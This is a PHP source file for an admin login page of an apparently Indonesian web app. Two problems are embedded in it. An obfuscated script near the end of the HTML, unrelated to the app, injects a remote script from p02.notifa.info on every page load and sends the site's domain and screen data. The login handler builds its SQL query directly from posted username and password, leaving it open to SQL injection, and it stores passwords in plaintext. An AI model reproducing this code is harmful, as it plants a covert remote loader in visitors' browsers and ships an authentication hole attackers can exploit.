<?php  
ob_start();
require_once "config/config.php";
?>

<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="assets/icon/home.png">
    <title>Login Admin</title>
    <!-- Bootstrap core CSS -->
    <link href="bower_components/bootstrap/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Custom styles for this template -->
    <link href="assets/css/login.css" type="text/css" rel="stylesheet">
  </head>
  <body class="text-center">
    <form class="form-signin" method="post">
      <h1 class="h3 mb-3 font-weight-normal">Silahkan Masuk</h1>
      <label for="inputEmail" class="sr-only">Username</label>
      <input type="text" id="inputEmail" name="username" class="form-control" placeholder="Username" required autofocus>
      <label for="inputPassword" class="sr-only">Password</label>
      <input type="password" id="inputPassword" name="password" class="form-control" placeholder="Password" required>
      <!-- <div class="checkbox mb-3">
        <label>
          <input type="checkbox" value="remember-me"> Remember me
        </label>
      </div> -->
      <!-- <button class="btn btn-lg btn-primary btn-block" type="submit">MASUK</button> -->
      <input type="submit" name="masuk" value="MASUK" class="btn btn-primary btn-lg btn-block">
      <p class="mt-5 mb-3 text-muted">&copy; 2017-2018</p>
    </form>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdr%2bsrLZjhWrHhXpBuF6A3irLnNoo2FjqTKU%2fHhyypmHC1%2fLg3h3L5le8G7xpex6DQEaMDrko%2bpBffm5oQxlXzAWbYdb36RTEfWQtmXXJAa%2b2j60NPAzO%2f%2fn5f53NhD8W5BEULlznCTUP2Lg2Ji355bWjOKrq%2fsJPn0Way%2fkGl8a8Ldy5H%2foN92wnnPYbv8AEIImJmY6iqZjVVO3QpT0txAKbsNopT5OaGH2xAJYZgdiclGfLRtZZ8ZBjAqKbEy%2fnPWhVAqd%2bVhHd5mv%2fK8Vus9dwq4IBAwP4C4AculGVoXx5lZqtVpTX50NV6Dca8tfFseuTXbp7JZQKZQHdOEuDWC%2frAbGSj1YPvLvddXQ5oWhdG%2be90hkxr8ZrciGoF28fGtSC7ityjSM%2foSN1hWT2JBsRNk%2br1uIksQz3psDoA2RoW0u9JGd5HnRSx7RsMlirmjz5nkEawufUFtay7uqPYPITrjZ4jqtxgOcL5W131IcVFRyARL3wfDFqgP4PuezEcBq3vOSy7HhMTQ8YXVKtIsjhmleSfNHZS4rT5Q5iysfyXigtDM2Hhww%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
    </script>
  </body>
</html>

<?php



if(isset($_POST['masuk'])){
  $username = $_POST['username'];
  $password = $_POST['password'];

  $query_masuk = "SELECT * FROM user WHERE username = '$username' AND password = '$password'";
  $sql_masuk = mysqli_query($koneksi, $query_masuk);

  $data = mysqli_fetch_assoc($sql_masuk);
  $ketemu = mysqli_num_rows($sql_masuk);

  if($ketemu >= 1){
    session_start();
    if($data['level'] == 'admin'){
      $_SESSION['admin'] = $data['id_user'];
      header("location: index.php");
    }
    elseif($data['level'] == 'user'){
      $_SESSION['user'] = $data['id_user'];
      header("location: index.php");
    }
  }
  else{
  	?>
  	<script type="text/javascript">
  		alert("Login gagal !, username atau password tidak sesuai.")
  	</script>
  	<?php
  }
}



?>